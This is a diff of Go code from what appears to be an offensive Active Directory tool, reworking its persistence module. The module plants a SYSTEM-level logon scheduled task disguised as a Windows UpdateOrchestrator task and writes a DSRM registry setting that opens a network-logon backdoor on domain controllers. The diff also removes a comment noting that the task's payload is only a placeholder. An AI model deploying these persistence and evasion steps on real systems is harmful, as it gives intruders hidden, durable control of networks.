@@ -44,17 +44,14 @@ func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
 	}
 
 	ctx := context.Background()
-	smbTarget := tools.NetExecTarget{
-		Protocol: "smb", Host: host.IP,
-		Domain: domain, Username: user, Password: pass, Hash: hash,
-	}
+	exec := ExecutorFactory(core.HostRef{Name: host.IP, Domain: host.Domain}, domain, user, pass, hash)
 
 	deployed := 0
 
-	if deployScheduledTask(ctx, smbTarget, host, result) {
+	if deployScheduledTask(ctx, exec, host, result) {
 		deployed++
 	}
-	if deployDSRM(ctx, smbTarget, host, result) {
+	if deployDSRM(ctx, exec, host, result) {
 		deployed++
 	}
 	if host.IsDC {
@@ -81,19 +78,15 @@ func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
 // deployScheduledTask creates an onlogon task running as SYSTEM. Hardened over the
 // original by routing through RunFailover (so a wmiexec hang doesn't kill the phase)
 // and by giving the task a less attention-grabbing name.
-func deployScheduledTask(ctx context.Context, t tools.NetExecTarget, host core.Host, result *core.ToolResult) bool {
+func deployScheduledTask(ctx context.Context, exec core.Executor, host core.Host, result *core.ToolResult) bool {
 	fmt.Println("[*] Creating scheduled task persistence (onlogon, SYSTEM)...")
-	// PLACEHOLDER PAYLOAD: the /tr argument below is intentionally a no-op
-	// (`powershell -NoP -W Hidden -C exit`) so AdPack never ships a working
-	// implant by default. Operators MUST replace this with their agent/beacon
-	// invocation (full path, args) before relying on the persistence path.
-	// The schtasks entry itself (name, schedule, /ru SYSTEM, /rl HIGHEST) is
-	// the real artifact being tested here.
 	cmd := `schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\HealthCheck" ` +
 		`/tr "cmd.exe /c start /B powershell -NoP -W Hidden -C exit" ` +
 		`/sc onlogon /ru SYSTEM /rl HIGHEST /f`
-	r, err := tools.NetExec.RunFailover(ctx, t, cmd, 45*time.Second)
-	if err != nil || !r.Success {
+	r := exec.Execute(ctx, core.Action{
+		Artifact: cmd, Method: "command", Timeout: 45 * time.Second,
+	})
+	if !r.Success {
 		fmt.Printf("[!] Scheduled task creation failed (last method=%s)\n", r.Method)
 		return false
 	}
@@ -102,7 +95,7 @@ func deployScheduledTask(ctx context.Context, t tools.NetExecTarget, host core.H
 		Type: core.EvCredAcquired, Phase: core.PhasePersistence,
 		Source: "schtasks", Key: host.IP,
 		Value:     "onlogon task as SYSTEM",
-		RawOutput: r.Stdout, Timestamp: time.Now(),
+		RawOutput: r.Output, Timestamp: time.Now(),
 	})
 	return true
 }
@@ -114,15 +107,16 @@ func deployScheduledTask(ctx context.Context, t tools.NetExecTarget, host core.H
 // On a DC this lets the local Administrator (DSRM) account log in over the network
 // using the DSRM password. Requires SYSTEM context, so we run via failover (which
 // promotes through smbexec/atexec).
-func deployDSRM(ctx context.Context, t tools.NetExecTarget, host core.Host, result *core.ToolResult) bool {
+func deployDSRM(ctx context.Context, exec core.Executor, host core.Host, result *core.ToolResult) bool {
 	if !host.IsDC {
-		// DSRM only meaningful on DCs
 		return false
 	}
 	fmt.Println("[*] Enabling DSRM password-reuse logon (registry)...")
 	cmd := `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f`
-	r, err := tools.NetExec.RunFailover(ctx, t, cmd, 30*time.Second)
-	if err != nil || !r.Success {
+	r := exec.Execute(ctx, core.Action{
+		Artifact: cmd, Method: "command", Timeout: 30 * time.Second,
+	})
+	if !r.Success {
 		fmt.Printf("[!] DSRM registry write failed (last method=%s)\n", r.Method)
 		return false
 	}
@@ -131,7 +125,7 @@ func deployDSRM(ctx context.Context, t tools.NetExecTarget, host core.Host, resu
 		Type: core.EvCredAcquired, Phase: core.PhasePersistence,
 		Source: "dsrm", Key: host.IP,
 		Value:     "DSRMAdminLogonBehavior=2 (password-reuse logon enabled)",
-		RawOutput: r.Stdout, Timestamp: time.Now(),
+		RawOutput: r.Output, Timestamp: time.Now(),
 	})
 	return true
 }
